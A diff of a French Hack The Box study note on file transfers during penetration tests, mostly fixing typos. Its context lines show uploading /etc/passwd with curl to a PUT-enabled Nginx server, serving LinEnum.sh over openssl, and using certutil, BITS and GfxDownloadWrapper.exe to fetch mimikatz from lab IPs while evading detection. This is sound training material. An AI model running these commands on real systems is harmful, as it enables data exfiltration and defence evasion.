@@ -2,7 +2,7 @@
 title: File Transfers
 description: 
 published: true
-date: 2025-05-04T16:15:14.169Z
+date: 2025-05-04T16:17:08.170Z
 tags: notes, htb, module
 editor: markdown
 dateCreated: 2025-03-16T15:21:30.098Z
@@ -783,7 +783,7 @@ Sauf demande du client, il ne faut pas exfiltrer de vraies données sensibles. P
 
 ### File Encryption on Windows
 
-Pour chiffrer des fichiers et informations sur Windows, il est possible d'utiliser le script [Invoke-AESEncryption.ps1](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1) disponible sur PowerShellGallery. Ce script permet de chiffrer un fichier ou une châine de caractères avec AES.
+Pour chiffrer des fichiers et informations sur Windows, il est possible d'utiliser le script [Invoke-AESEncryption.ps1](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1) disponible sur PowerShellGallery. Ce script permet de chiffrer un fichier ou une chaine de caractères avec AES.
 
 Par exemple:
 
@@ -795,7 +795,7 @@ Invoke-AESEncryption -Mode Encrypt -Key <clé> -Path <fichier>
 
 Pour chiffrer des fichiers et informations sur Linux, il est possible d'utiliser l'outil [OpenSSL](https://www.openssl.org/). OpenSSL est un outil souvent présent par défaut dans les distributions.
 
-La [documentation officielle](https://www.openssl.org/docs/man1.1.1/man1/openssl-enc.html) présente les ciphers suportés et les différentes options.
+La [documentation officielle](https://www.openssl.org/docs/man1.1.1/man1/openssl-enc.html) présente les ciphers supportés et les différentes options.
 
 Pour chiffer:
 
@@ -817,11 +817,11 @@ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
 - `enc` : indique une opération de chiffrement/déchiffrement
 - `-d` : indique une opération de déchiffrement
 
-En plus du chhiffrement, il est conseillé de transferer les données via un canal sécurisé (openssl,https,sftp,ssh...).
+En plus du chiffrement, il est conseillé de transférer les données via un canal sécurisé (openssl,https,sftp,ssh...).
 
 ## Catching Files over HTTP/S
 
-Le transfert de fichiers via HTTP/HTTPS estcourant, car ces protocoles sont souvent autorisés sur les pare-feu. De plus, les données sont souvent chiffrés en transit. Transférer un fichier sensible en clair peut déclencher des alertes IDS/IPS. On peut utiliser `uploadserver` en Python, mais aussi Apache ou Nginx pour créer un serveur web sécurisé pour les uploads.
+Le transfert de fichiers via HTTP/HTTPS est courant, car ces protocoles sont souvent autorisés sur les pare-feu. De plus, les données sont souvent chiffrés en transit. Transférer un fichier sensible en clair peut déclencher des alertes IDS/IPS. On peut utiliser `uploadserver` en Python, mais aussi Apache ou Nginx pour créer un serveur web sécurisé pour les uploads.
 
 ### Nginx - Enabling PUT
 
@@ -847,7 +847,7 @@ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
 ```
 server {
     listen 9001;
-    
+
     location /SecretUploadDirectory/ {
         root    /var/www/uploads;
         dav_methods PUT;
@@ -873,7 +873,7 @@ sudo systemctl restart nginx.service
 curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
 ```
 
-Par défaut avec Apache, le listage des répertoires est activé (si aucun fichier index.html n'est présent), ce qui permet à n'importe qui de voir le contenu du répertoire (risque de confidentialité). Sur Nginx, cela n'est pas activé par défaut grâce aux fonctionnalitées minimales.
+Par défaut avec Apache, le listage des répertoires est activé (si aucun fichier index.html n'est présent), ce qui permet à n'importe qui de voir le contenu du répertoire (risque de confidentialité). Sur Nginx, cela n'est pas activé par défaut grâce aux fonctionnalités minimales.
 
 ## Living off The Land
 
@@ -881,8 +881,8 @@ L'expression "Living off the land" a été inventée par Christopher Campbell (@
 
 Le terme **LOLBins** (Living off the Land binaries) provient d'une discussion sur Twitter concernant le nom à donner aux binaires qu'un attaquant peut utiliser pour effectuer des actions au-delà de leur fonction initiale. Il existe actuellement deux sites web qui agrègent des informations sur ces binaires:
 
-* [**LOLBAS Project**](/Notes/HTB/Modules/file-transfers) pour les binaires Windows ([repository fficiel](https://github.com/LOLBAS-Project/LOLBAS)).
-* [**GTFOBins**](https://gtfobins.github.io/) pour les binaires Linux ([repository fficiel](https://github.com/GTFOBins/GTFOBins.github.io)).
+- [**LOLBAS Project**](/Notes/HTB/Modules/file-transfers) pour les binaires Windows ([repository officiel](https://github.com/LOLBAS-Project/LOLBAS)).
+- [**GTFOBins**](https://gtfobins.github.io/) pour les binaires Linux ([repository officiel](https://github.com/GTFOBins/GTFOBins.github.io)).
 
 Les binaires **Living off the Land** peuvent être utilisés pour effectuer des fonctions comme :
 
@@ -892,7 +892,6 @@ Les binaires **Living off the Land** peuvent être utilisés pour effectuer des 
 - Lecture de fichiers
 - Écriture de fichiers
 - Contournement de sécurité ou évasion (bypass)
-
 
 ### Using the LOLBAS and GTFOBins Project
 
@@ -918,7 +917,7 @@ Créer un certificat auto-signé:
 openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
 ```
 
-Créer un serveur OpenSSL qui envoi le contenu d'un fichier lors des requètes:
+Créer un serveur OpenSSL qui envoi le contenu d'un fichier lors des requêtes:
 
 ```
 openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
@@ -949,7 +948,6 @@ mport-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/n
 Casey Smith (@subTee) a découvert que Certutil peut être utilisé pour télécharger des fichiers.
 Disponible dans toutes les versions de Windows, il est devenu un outil populaire de transfert de fichiers, agissant comme un `wget` pour Windows.
 Cependant, [l'interface de scan antimalware (AMSI)](https://learn.microsoft.com/fr-fr/windows/win32/amsi/antimalware-scan-interface-portal) détecte actuellement cette utilisation de Certutil comme malveillante.
-
 
 Télécharger un fichier avec `certutil.exe`:
 
@@ -1002,4 +1000,4 @@ Un exemple est le pilote graphique Intel pour Windows 10 (GfxDownloadWrapper.exe
 GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
 ```
 
-Certains binaires LOLBIN/LOLBAS peuvent donc être autorisés à s'exécuter via une liste blanche d'applications et/ou être exclus des alertes. 
+Certains binaires LOLBIN/LOLBAS peuvent donc être autorisés à s'exécuter via une liste blanche d'applications et/ou être exclus des alertes.
